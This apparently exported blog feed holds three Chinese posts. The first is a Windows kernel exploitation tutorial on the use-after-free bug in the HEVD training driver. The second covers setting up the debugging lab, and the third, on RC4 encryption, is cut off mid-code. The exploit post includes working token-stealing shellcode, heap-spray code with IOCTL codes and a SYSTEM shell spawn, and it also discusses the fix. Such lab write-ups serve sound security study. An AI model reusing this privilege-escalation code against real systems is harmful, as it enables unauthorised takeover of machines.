<h1 id="0x01：漏洞原理"><a href="#0x01：漏洞原理" class="headerlink" title="0x01：漏洞原理"></a>0x01：漏洞原理</h1><h2 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h2><p>首先我们要明白一个道理，运行一个普通的程序在正常情况下是没有系统权限的，但是往往在一些漏洞利用中，我们会想要让一个普通的程序达到很高的权限就比如系统权限，下面做一个实验，我们在虚拟机中用普通权限打开一个cmd然后断下来，用<code>!dml_proc</code>命令查看当前进程的信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; !dml_proc</span><br><span class="line">Address  PID  Image file name</span><br><span class="line">865ce8a8 4    System         </span><br><span class="line">87aa9970 10c  smss.exe       </span><br><span class="line">880d4d40 164  csrss.exe      </span><br><span class="line">881e6200 198  wininit.exe    </span><br><span class="line">881e69e0 1a0  csrss.exe      </span><br><span class="line">...</span><br><span class="line">87040ca0 bc0  cmd.exe</span><br></pre></td></tr></table></figure>
<p>我们可以看到<code>System</code>的地址是 865ce8a8 ，<code>cmd</code>的地址是 87040ca0 ，我们可以通过下面的方式查看地址中的成员信息，这里之所以 +f8 是因为<code>token</code>的位置是在进程偏移为 0xf8 的地方，也就是<code>Value</code>的值，那么什么是<code>token</code>?你可以把它比做等级，不同的权限等级不同，比如系统权限等级是5级(最高)，那么普通权限就好比是1级，我们可以通过修改我们的等级达到系统的5级权限，这也就是提权的基本原理，如果我们可以修改进程的<code>token</code>为系统的<code>token</code>，那么就可以提权成功，我们手动操作一次下面是修改前<code>token</code>值的对比</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; dt nt!_EX_FAST_REF 865ce8a8+f8</span><br><span class="line">   +0x000 Object           : 0x8a201275 Void</span><br><span class="line">   +0x000 RefCnt           : 0y101</span><br><span class="line">   +0x000 Value            : 0x8a201275 // system token</span><br><span class="line">kd&gt; dt nt!_EX_FAST_REF 87040ca0+f8</span><br><span class="line">   +0x000 Object           : 0x944a2c02 Void</span><br><span class="line">   +0x000 RefCnt           : 0y010</span><br><span class="line">   +0x000 Value            : 0x944a2c02 // cmd token</span><br></pre></td></tr></table></figure>
<p>我们通过ed命令修改cmd token的值为system token</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; ed 87040ca0+f8 8a201275</span><br><span class="line">kd&gt; dt nt!_EX_FAST_REF 87040ca0+f8</span><br><span class="line">   +0x000 Object           : 0x8a201275 Void</span><br><span class="line">   +0x000 RefCnt           : 0y101</span><br><span class="line">   +0x000 Value            : 0x8a201275</span><br></pre></td></tr></table></figure>
<p>用<code>whoami</code>命令发现权限已经变成了系统权限</p>
<p><img src="/2019/06/28/Windows-Kernel-Exploit-内核漏洞学习-1-UAF/1.png" alt="1"></p>
<p>我们将上面的操作变为汇编的形式如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void ShellCode()</span><br><span class="line">&#123;</span><br><span class="line">    _asm </span><br><span class="line">    &#123;</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        pushad</span><br><span class="line">        mov eax,fs:[124h]		// 找到当前线程的_KTHREAD结构</span><br><span class="line">        mov eax, [eax + 0x50]    // 找到_EPROCESS结构</span><br><span class="line">        mov ecx, eax</span><br><span class="line">        mov edx, 4    // edx = system PID(4)</span><br><span class="line"></span><br><span class="line">        // 循环是为了获取system的_EPROCESS</span><br><span class="line">    find_sys_pid:</span><br><span class="line">        mov eax, [eax + 0xb8]	// 找到进程活动链表</span><br><span class="line">        sub eax, 0xb8    		// 链表遍历</span><br><span class="line">        cmp [eax + 0xb4], edx    // 根据PID判断是否为SYSTEM</span><br><span class="line">        jnz find_sys_pid</span><br><span class="line"></span><br><span class="line">        // 替换Token</span><br><span class="line">        mov edx, [eax + 0xf8]</span><br><span class="line">        mov [ecx + 0xf8], edx</span><br><span class="line">        popad</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解释一下上面的代码，fs寄存器在Ring0中指向一个称为KPCR的数据结构，即FS段的起点与 KPCR 结构对齐，而在Ring0中fs寄存器一般为0x30，这样fs:[124]就指向KPRCB数据结构的第四个字节。由于 KPRCB 结构比较大，在此就不列出来了。查看其数据结构可以看到第四个字节指向<code>CurrentThead</code>(KTHREAD类型)。这样fs:[124]其实是指向当前线程的<code>_KTHREAD</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; dt nt!_KPCR</span><br><span class="line">   +0x000 NtTib            : _NT_TIB</span><br><span class="line">   +0x000 Used_ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +0x004 Used_StackBase   : Ptr32 Void</span><br><span class="line">   +0x008 Spare2           : Ptr32 Void</span><br><span class="line">   +0x00c TssCopy          : Ptr32 Void</span><br><span class="line">   +0x010 ContextSwitches  : Uint4B</span><br><span class="line">   +0x014 SetMemberCopy    : Uint4B</span><br><span class="line">   +0x018 Used_Self        : Ptr32 Void</span><br><span class="line">   +0x01c SelfPcr          : Ptr32 _KPCR</span><br><span class="line">   +0x020 Prcb             : Ptr32 _KPRCB</span><br><span class="line">   +0x024 Irql             : UChar</span><br><span class="line">   +0x028 IRR              : Uint4B</span><br><span class="line">   +0x02c IrrActive        : Uint4B</span><br><span class="line">   +0x030 IDR              : Uint4B</span><br><span class="line">   +0x034 KdVersionBlock   : Ptr32 Void</span><br><span class="line">   +0x038 IDT              : Ptr32 _KIDTENTRY</span><br><span class="line">   +0x03c GDT              : Ptr32 _KGDTENTRY</span><br><span class="line">   +0x040 TSS              : Ptr32 _KTSS</span><br><span class="line">   +0x044 MajorVersion     : Uint2B</span><br><span class="line">   +0x046 MinorVersion     : Uint2B</span><br><span class="line">   +0x048 SetMember        : Uint4B</span><br><span class="line">   +0x04c StallScaleFactor : Uint4B</span><br><span class="line">   +0x050 SpareUnused      : UChar</span><br><span class="line">   +0x051 Number           : UChar</span><br><span class="line">   +0x052 Spare0           : UChar</span><br><span class="line">   +0x053 SecondLevelCacheAssociativity : UChar</span><br><span class="line">   +0x054 VdmAlert         : Uint4B</span><br><span class="line">   +0x058 KernelReserved   : [14] Uint4B</span><br><span class="line">   +0x090 SecondLevelCacheSize : Uint4B</span><br><span class="line">   +0x094 HalReserved      : [16] Uint4B</span><br><span class="line">   +0x0d4 InterruptMode    : Uint4B</span><br><span class="line">   +0x0d8 Spare1           : UChar</span><br><span class="line">   +0x0dc KernelReserved2  : [17] Uint4B</span><br><span class="line">   +0x120 PrcbData         : _KPRCB</span><br></pre></td></tr></table></figure>
<p>再来看看<code>_EPROCESS</code>的结构，+0xb8处是进程活动链表，用于储存当前进程的信息，我们通过对它的遍历，可以找到system的<code>token</code>，我们知道system的PID一直是4，通过这一点我们就可以遍历了，遍历到系统<code>token</code>之后替换就行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; dt nt!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x098 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x0a0 CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +0x0a8 ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +0x0b0 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +0x0b4 UniqueProcessId  : Ptr32 Void</span><br><span class="line">   +0x0b8 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   +0x0c0 ProcessQuotaUsage : [2] Uint4B</span><br><span class="line">   +0x0c8 ProcessQuotaPeak : [2] Uint4B</span><br><span class="line">   +0x0d0 CommitCharge     : Uint4B</span><br><span class="line">   +0x0d4 QuotaBlock       : Ptr32 _EPROCESS_QUOTA_BLOCK</span><br><span class="line">   +0x0d8 CpuQuotaBlock    : Ptr32 _PS_CPU_QUOTA_BLOCK</span><br><span class="line">   +0x0dc PeakVirtualSize  : Uint4B</span><br><span class="line">   +0x0e0 VirtualSize      : Uint4B</span><br><span class="line">   +0x0e4 SessionProcessLinks : _LIST_ENTRY</span><br><span class="line">   +0x0ec DebugPort        : Ptr32 Void</span><br><span class="line">   ...</span><br><span class="line">   +0x2b8 SmallestTimerResolution : Uint4B</span><br><span class="line">   +0x2bc TimerResolutionStackRecord : Ptr32 _PO_DIAG_STACK_RECORD</span><br></pre></td></tr></table></figure>
<h2 id="UAF原理"><a href="#UAF原理" class="headerlink" title="UAF原理"></a>UAF原理</h2><p>如果你是一个pwn选手，那么肯定很清楚UAF的原理，简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况：</p>
<ul>
<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li>
</ul>
<p>而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。类比Linux的内存管理机制，Windows下的内存申请也是有规律的，我们知道<code>ExAllocatePoolWithTag</code>函数中申请的内存并不是胡乱申请的，操作系统会选择当前大小最合适的空闲堆来存放它。如果你足够细心的话，在源码中你会发现在<code>UseUaFObject</code>中存在<code>g_UseAfterFreeObject-&gt;Callback();</code>的片段，如果我们将<code>Callback</code>覆盖为<code>shellcode</code>就可以提权了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">USE_AFTER_FREE</span> &#123;</span></span><br><span class="line">    FunctionPointer Callback;</span><br><span class="line">    CHAR Buffer[<span class="number">0x54</span>];</span><br><span class="line">&#125; USE_AFTER_FREE, *PUSE_AFTER_FREE;</span><br><span class="line"></span><br><span class="line">PUSE_AFTER_FREE g_UseAfterFreeObject = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">UseUaFObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_UseAfterFreeObject) &#123;</span><br><span class="line">            DbgPrint(<span class="string">"[+] Using UaF Object\n"</span>);</span><br><span class="line">            DbgPrint(<span class="string">"[+] g_UseAfterFreeObject: 0x%p\n"</span>, g_UseAfterFreeObject);</span><br><span class="line">            DbgPrint(<span class="string">"[+] g_UseAfterFreeObject-&gt;Callback: 0x%p\n"</span>, g_UseAfterFreeObject-&gt;Callback);</span><br><span class="line">            DbgPrint(<span class="string">"[+] Calling Callback\n"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (g_UseAfterFreeObject-&gt;Callback) &#123;</span><br><span class="line">                g_UseAfterFreeObject-&gt;Callback(); <span class="comment">// g_UseAfterFreeObject-&gt;shellcode();</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Status = STATUS_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        Status = GetExceptionCode();</span><br><span class="line">        DbgPrint(<span class="string">"[-] Exception Code: 0x%X\n"</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x02：漏洞利用"><a href="#0x02：漏洞利用" class="headerlink" title="0x02：漏洞利用"></a>0x02：漏洞利用</h1><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>如果我们一开始申请堆的大小和UAF中堆的大小相同，那么就可能申请到我们的这块内存，假如我们又提前构造好了这块内存中的数据，那么当最后释放的时候就会指向我们shellcode的位置，从而达到提取的效果。但是这里有个问题，我们电脑中有许许多多的空闲内存，如果我们只构造一块假堆，我们并不能保证刚好能够用到我们的这块内存，所以我们就需要构造很多个这种堆，换句话说就是<code>堆海战术</code>吧，如果你看过0day安全这本书，里面说的堆喷射也就是这个原理。</p>
<h2 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h2><p>根据上面我们已经得到提权的代码，相当于我们只有子弹没有枪，这样肯定是不行的，我们首先伪造环境</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">FAKE_USE_AFTER_FREE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	FunctionPointer countinter;</span><br><span class="line">	<span class="keyword">char</span> bufffer[<span class="number">0x54</span>];</span><br><span class="line">&#125;FAKE_USE_AFTER_FREE, *PUSE_AFTER_FREE;</span><br><span class="line"></span><br><span class="line">PUSE_AFTER_FREE fakeG_UseAfterFree = (PUSE_AFTER_FREE)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(FAKE_USE_AFTER_FREE));</span><br><span class="line">fakeG_UseAfterFree-&gt;countinter = ShellCode;</span><br><span class="line">RtlFillMemory(fakeG_UseAfterFree-&gt;bufffer, <span class="keyword">sizeof</span>(fakeG_UseAfterFree-&gt;bufffer), <span class="string">'A'</span>);</span><br></pre></td></tr></table></figure>
<p>接下来我们进行堆喷射</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 调用 AllocateFakeObject() 对象</span></span><br><span class="line">    DeviceIoControl(hDevice, <span class="number">0x22201F</span>, fakeG_UseAfterFree, <span class="number">0x60</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;recvBuf, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>你可能会疑惑上面的IO控制码是如何得到的，这是通过逆向分析<code>IrpDeviceIoCtlHandler</code>函数得到的，我们通过<code>DeviceIoControl</code>函数实现对驱动中函数的调用，下面原理相同</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 调用 UseUaFObject() 函数</span></span><br><span class="line">DeviceIoControl(hDevice, <span class="number">0x222013</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;recvBuf, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 调用 FreeUaFObject() 函数</span></span><br><span class="line">DeviceIoControl(hDevice, <span class="number">0x22201B</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;recvBuf, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>最后我们需要一个函数来调用 cmd 窗口检验我们是否提权成功</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> VOID <span class="title">CreateCmd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="keyword">sizeof</span>(si) &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">	si.wShowWindow = SW_SHOW;</span><br><span class="line">	WCHAR wzFilePath[MAX_PATH] = &#123; <span class="string">L"cmd.exe"</span> &#125;;</span><br><span class="line">	BOOL bReturn = CreateProcessW(<span class="literal">NULL</span>, wzFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOW)&amp;si, &amp;pi);</span><br><span class="line">	<span class="keyword">if</span> (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面是主要的代码，详细的代码参考<a href="https://github.com/ThunderJie/Windows-Kernel-Exploit/blob/master/HEVD/UAF/UAF/test1.c" target="_blank" rel="noopener">这里</a>，最后提权成功</p>
<p><img src="/2019/06/28/Windows-Kernel-Exploit-内核漏洞学习-1-UAF/test.gif" alt></p>
<h1 id="0x03：补丁思考"><a href="#0x03：补丁思考" class="headerlink" title="0x03：补丁思考"></a>0x03：补丁思考</h1><p>对于 UseAfterFree 漏洞的修复，如果你看过我写的一篇<a href="https://thunderjie.github.io/2019/03/04/Use-After-Free/" target="_blank" rel="noopener">pwn-UAF入门</a>的话，补丁的修复就很明显了，我们漏洞利用是在 free 掉了对象之后再次对它的引用，如果我们增加一个条件，判断对象是否为空，如果为空则不调用，那么就可以避免 UseAfterFree  的发生，而在<code>FreeUaFObject()</code>函数中指明了安全的措施，我们只需要把<code>g_UseAfterFreeObject</code>置为NULL</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SECURE</span></span><br><span class="line">            <span class="comment">// Secure Note: This is secure because the developer is setting</span></span><br><span class="line">            <span class="comment">// 'g_UseAfterFreeObject' to NULL once the Pool chunk is being freed</span></span><br><span class="line">            ExFreePoolWithTag((PVOID)g_UseAfterFreeObject, (ULONG)POOL_TAG);</span><br><span class="line"></span><br><span class="line">            g_UseAfterFreeObject = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">            <span class="comment">// Vulnerability Note: This is a vanilla Use After Free vulnerability</span></span><br><span class="line">            <span class="comment">// because the developer is not setting 'g_UseAfterFreeObject' to NULL.</span></span><br><span class="line">            <span class="comment">// Hence, g_UseAfterFreeObject still holds the reference to stale pointer</span></span><br><span class="line">            <span class="comment">// (dangling pointer)</span></span><br><span class="line">            ExFreePoolWithTag((PVOID)g_UseAfterFreeObject, (ULONG)POOL_TAG);</span><br></pre></td></tr></table></figure>
<p>下面是在<code>UseUaFObject()</code>函数中的修复方案：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(g_UseAfterFreeObject != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (g_UseAfterFreeObject-&gt;Callback) &#123;</span><br><span class="line">		g_UseAfterFreeObject-&gt;Callback();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x04：后记"><a href="#0x04：后记" class="headerlink" title="0x04：后记"></a>0x04：后记</h1><p>这一篇之后我会继续写windows-kernel-exploit系列2，主要还是研究HEVD中的其他漏洞，类似的UAF漏洞可以参考我研究的<a href="https://thunderjie.github.io/2019/02/21/CVE-2014-4113/#more" target="_blank" rel="noopener">2014-4113</a>和我即将研究的2018-8120，最后，吹爆wjllz师傅！</p>
<p>参考链接：</p>
<p><a href="https://rootkits.xyz/blog/2018/04/kernel-use-after-free/" target="_blank" rel="noopener">https://rootkits.xyz/blog/2018/04/kernel-use-after-free/</a></p>
<p><a href="https://redogwu.github.io/2018/11/02/windows-kernel-exploit-part-1/" target="_blank" rel="noopener">https://redogwu.github.io/2018/11/02/windows-kernel-exploit-part-1/</a></p>
]]></content>
      <categories>
        <category>Windows Kernel</category>
      </categories>
      <tags>
        <tag>Windows Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows-Kernel-Exploit-内核漏洞学习(0)-环境安装</title>
    <url>/2019/06/28/Windows-Kernel-Exploit-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-0-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>这一系列文章是记录我在Windows内核漏洞学习的过程，既然是第0篇，那肯定是着重点放在环境的搭建和介绍，我的打算是先把HEVD中的大部分漏洞走一遍，如果文章里面有错误，欢迎大佬们指正，实验环境是在Windows  7 x86 sp1，你需要安装的主要内容如下：</p>
<ul>
<li>Windows 7 x86 sp1虚拟机</li>
<li>windbg + virtualKD 调试环境</li>
<li><a href="https://www.osronline.com/article.cfm%5earticle=157.htm" target="_blank" rel="noopener">OSR驱动加载工具</a> + <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver" target="_blank" rel="noopener">HEVD 驱动程序</a></li>
</ul>
<h1 id="0x01：环境安装"><a href="#0x01：环境安装" class="headerlink" title="0x01：环境安装"></a>0x01：环境安装</h1><p>下面我简要说一下环境的配置，配置环境是一件麻烦的事情，不同的时期会有不同的新工具和版本，我们需要的东西只是一个虚拟机，调试器和驱动加载工具，所以如果下面的方法你不能得到理想的效果，可以参考许多其他最新的文章</p>
<h2 id="windbg"><a href="#windbg" class="headerlink" title="windbg"></a>windbg</h2><p>我们第一步需要准备的就是一个Windows7 x86 sp1的虚拟机了，虚拟机就不多解释如何安装了，当你安装好了虚拟机之后你还需要安装一个内核调试工具windbg，如果你是一个 pwn 选手，那你肯定熟悉 gdb 调试，如果你是 reverse 选手，那你肯定熟悉 OD 调试，但是我们现在是对内核调试，需要用windbg调试，建议使用<a href="https://www.microsoft.com/zh-cn/p/windbg-preview/9pgjgd53tn86?rtc=1&amp;activetab=pivot:overviewtab" target="_blank" rel="noopener">windbg官方预览版</a>，进去之后点击获取就会在微软官方应用商城下载<br><img src="/2019/06/28/Windows-Kernel-Exploit-内核漏洞学习-0-环境安装/1.png" alt></p>
<p>下载之后我们需要对符号路径进行设置，这是我自己的设置，根据自己HEVD的路径不同，选择填入自己的路径</p>
<p> <img src="/2019/06/28/Windows-Kernel-Exploit-内核漏洞学习-0-环境安装/2.png" alt></p>
<p>下面是我的路径信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\ Symbols</span><br><span class="line"> SRV*C:\MyLocalSymbols*http://msdl.microsoft.com/download/symbols</span><br><span class="line"></span><br><span class="line">srv*C:\symbols_folder*http://msdl.microsoft.com/download/symbols</span><br><span class="line">D:\kernel study\kernel base tools\HEVD\i386</span><br><span class="line">SRV*c:\mysymbol* http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure>
<h2 id="VirtualKD"><a href="#VirtualKD" class="headerlink" title="VirtualKD"></a>VirtualKD</h2><p>VirtualKD 在<a href="http://sysprogs.com/legacy/virtualkd/" target="_blank" rel="noopener">这里</a>下载，下载完之后我们打开 Virtual Machine monitor ，点击 Debugger path 之后选择我们调试器的路径就可以用了</p>
<p> <img src="/2019/06/28/Windows-Kernel-Exploit-内核漏洞学习-0-环境安装/3.png" alt></p>
<p>双击调试的过程动态图在这里</p>
<p> <img src="/2019/06/28/Windows-Kernel-Exploit-内核漏洞学习-0-环境安装/test.gif" alt></p>
<h2 id="HEVD-OSR-loader"><a href="#HEVD-OSR-loader" class="headerlink" title="HEVD + OSR loader"></a>HEVD + OSR loader</h2><p>安装之后按如下操作即可加载HEVD驱动，开启服务</p>
<p> <img src="/2019/06/28/Windows-Kernel-Exploit-内核漏洞学习-0-环境安装/test2.gif" alt></p>
<h2 id="准备就绪"><a href="#准备就绪" class="headerlink" title="准备就绪"></a>准备就绪</h2><p>当上面的步骤都做完时，用windbg打印<code>lm m H*</code>命令，点击蓝色的HEVD，再点击蓝色的Browse all global symbols，能解析出地址就说明一切准备就绪，如下图</p>
<p> <img src="/2019/06/28/Windows-Kernel-Exploit-内核漏洞学习-0-环境安装/4.png" alt></p>
<h1 id="0x02：后续"><a href="#0x02：后续" class="headerlink" title="0x02：后续"></a>0x02：后续</h1><p>后面的文章我们会用HEVD来构造各种漏洞环境，依次在Windows 7 x86 sp1下感受Windows的pwn和Linux的有何区别，如果你不知道该准备些什么知识的时候，试着去了解一些驱动相关的知识，当然逆向的基础不能少，你需要掌握一些基本的汇编语言，准备的过程可能会出现许许多多奇怪的问题，这个时候就需要你去慢慢百度解决了，一定要有耐心，还有一些基础的工具你也需要提前准备好(IDA，VS，源码查看工具等等)</p>
]]></content>
      <categories>
        <category>Windows Kernel</category>
      </categories>
      <tags>
        <tag>Windows Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学逆向之RC4</title>
    <url>/2019/05/21/%E5%AF%86%E7%A0%81%E5%AD%A6%E9%80%86%E5%90%91%E4%B9%8BRC4/</url>
    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>在密码学中，<strong>RC4</strong>（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。</p>
<h1 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h1><table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>S-box(S)</td>
<td>256长度的char型数组，定义为: unsigned char sBox[256]</td>
</tr>
<tr>
<td>Key(K)</td>
<td>自定义的密钥，用来打乱 S-box</td>
</tr>
<tr>
<td>pData</td>
<td>用来加密的数据</td>
</tr>
</tbody>
</table>
<ol>
<li><p>初始化 S (256字节的char型数组)，key 是我们自定义的密钥，用来打乱 S ，i 确保 S-box 的每个元素都得到处理， j 保证 S-box 的搅乱是随机的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*初始化函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i] = i; <span class="comment">// 赋值 S</span></span><br><span class="line">		k[i] = key[i%Len]; <span class="comment">// 赋值 K </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		j = (j + s[i] + k[i]) % <span class="number">256</span>; <span class="comment">// 开始混淆</span></span><br><span class="line">		tmp = s[i]; </span><br><span class="line">		s[i] = s[j]; <span class="comment">// 交换s[i]和s[j]</span></span><br><span class="line">		s[j] = tmp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>加密过程将 S-box 和明文进行 xor 运算，得到密文，解密过程也完全相同</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*加解密*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">	<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; Len; k++)</span><br><span class="line">	&#123;</span><br><span class="line">		i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">		j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">		tmp = s[i];</span><br><span class="line">		s[i] = s[j]; <span class="comment">// 交换s[x]和s[y]</span></span><br><span class="line">		s[j] = tmp;</span><br><span class="line">		t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">		Data[k] ^= s[t];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>下面是 C 实现的代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> longULONG;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*初始化函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>, j = <span 